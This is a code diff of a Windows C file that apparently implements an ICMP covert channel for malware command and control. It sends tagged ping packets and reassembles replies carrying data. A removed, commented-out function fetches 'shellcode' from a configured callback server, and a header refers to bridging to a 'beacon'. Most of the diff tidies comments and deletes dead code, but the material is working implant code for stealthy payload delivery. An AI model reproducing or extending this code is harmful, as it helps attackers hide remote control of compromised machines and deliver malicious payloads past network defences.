@@ -177,6 +177,11 @@ int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int paylo
 //   - payload starts with “RQ47”
 // Reassembles chunks of data (each chunk carries up to ICMP_PAYLOAD_SIZE−TAG_SIZE bytes).
 //
+/*
+if seq == 0: Payload inbound (has size of inbound payload)
+if seq > 0: normal messages 
+
+*/
 char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
     char recvbuf[MAX_PACKET_SIZE];
     struct sockaddr_in from;
@@ -197,6 +202,10 @@ char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
             return NULL;
         }
 
+
+        ///////////////////////////////////////////////////////////////////////
+        //// Filters
+        ///////////////////////////////////////////////////////////////////////
         // Must be at least: IP header (20) + ICMP header (8) + TAG (4)
         if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
             continue;
@@ -205,26 +214,30 @@ char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
         struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
         char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);
 
-        // ─── Discard anything that is not an Echo Reply ───
+        // Discard anything that is not an Echo Reply 
         if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
             continue;
         }
 
-        // ─── Discard replies not matching our process ID ───
+        // Discard replies not matching our process ID
         USHORT resp_id = ntohs(icmp->ID);
         if (resp_id != (USHORT)GetCurrentProcessId()) {
             continue;
         }
 
-        // ─── Discard if payload does not begin with TAG ───
+        // Discard if payload does not begin with TAG 
         if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
             continue;
         }
 
+        ///////////////////////////////////////////////////////////////////////
+        //// Sequence Handling
+        ///////////////////////////////////////////////////////////////////////
+
         USHORT seq = ntohs(icmp->Sequence);
         printf("[+] Received Echo Reply: seq=%d, total_bytes=%d\n", seq, bytes);
 
-        // Handle seq 0 — “size” packet
+        // Handle seq 0 — the size packet which tells how big the inbound message will be
         if (seq == 0) {
             // Next 4 bytes after TAG is total payload size (big-endian)
             uint32_t netlen = 0;
@@ -323,56 +336,6 @@ char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
     return NULL;
 }
 
-//
-// recv_icmp: simple wrapper to receive a single Echo Reply (Type 0) carrying a small payload.
-// Returns a malloc’d buffer (null‐terminated) of payload bytes after the TAG.
-//
-// char* recv_icmp(SOCKET s) {
-//     char recvbuf[MAX_PACKET_SIZE];
-//     struct sockaddr_in from;
-//     int fromlen = sizeof(from);
-
-//     printf("[*] Waiting for single ICMP Echo Reply...\n");
-//     int bytes = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (SOCKADDR*)&from, &fromlen);
-//     if (bytes == SOCKET_ERROR) {
-//         printf("[-] recvfrom failed: %d\n", WSAGetLastError());
-//         return NULL;
-//     }
-
-//     if (bytes < IPV4_HEADER + ICMP_HEADER + TAG_SIZE) {
-//         return NULL;
-//     }
-
-//     struct icmp_header* icmp = (struct icmp_header*)(recvbuf + IPV4_HEADER);
-//     char* payload = recvbuf + IPV4_HEADER + sizeof(struct icmp_header);
-
-//     // Must be an Echo Reply (Type 0) for our PID
-//     if (icmp->Type != ICMP_ECHOREPLY || icmp->Code != 0) {
-//         return NULL;
-//     }
-//     if (ntohs(icmp->ID) != (USHORT)GetCurrentProcessId()) {
-//         return NULL;
-//     }
-//     // Must begin with TAG
-//     if (strncmp(payload, ICMP_TAG, TAG_SIZE) != 0) {
-//         return NULL;
-//     }
-
-//     // Copy whatever bytes follow the tag
-//     int payload_len = bytes - IPV4_HEADER - sizeof(struct icmp_header) - TAG_SIZE;
-//     if (payload_len <= 0) {
-//         return NULL;
-//     }
-//     char* out_data = (char*)malloc(payload_len + 1);
-//     if (!out_data) {
-//         perror("malloc");
-//         return NULL;
-//     }
-//     memcpy(out_data, payload + TAG_SIZE, payload_len);
-//     out_data[payload_len] = '\0';
-//     return out_data;
-// }
-
 // Modified recv_icmp to return both a data buffer and its length.
 // Caller must pass a pointer to a uint32_t to receive the length.
 char* recv_icmp(SOCKET s, uint32_t *out_len) {
@@ -428,51 +391,6 @@ char* recv_icmp(SOCKET s, uint32_t *out_len) {
     *out_len = (uint32_t)payload_len;
     return out_data;
 }
-
-
-/*
-Gets payload, returns char * to shellcode
-
-*/
-// char* get_payload(SOCKET s) {
-//     //socket setup
-//     struct sockaddr_in dest;
-//     dest.sin_family = AF_INET;
-//     dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
-
-//     //get payload
-//     // 1) Build “seq=0” size packet
-//     //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
-//     uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
-//     uint32_t netlen = htonl(expected_server_payload);
-
-//     char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-//     //// Copy “RQ47”
-//     memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-//     //// Then 4-byte big-endian length
-//     memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
-//     //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
-//     int size_payload_len = TAG_SIZE + sizeof(netlen);
-
-//     //// Send seq=0 Echo Request
-//     if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
-//         printf("[-] Failed to send seq=0 packet\n");
-//         closesocket(s);
-//         return NULL;
-//     }
-
-//     //// 2) Wait for and reassemble all fragments (Echo Replies)
-//     char* shellcode = recv_icmp_fragments(s);
-//     if (!shellcode) {
-//         printf("[-] Failed to receive full payload\n");
-//         closesocket(s);
-//         return NULL;
-//     }
-
-    
-//     printf("[+] Received full payload: first 256 bytes as string:\n    %.256s\n", shellcode);
-//     return shellcode;
-// }
 
 //
 // bridge_to_beacon: high-level flow
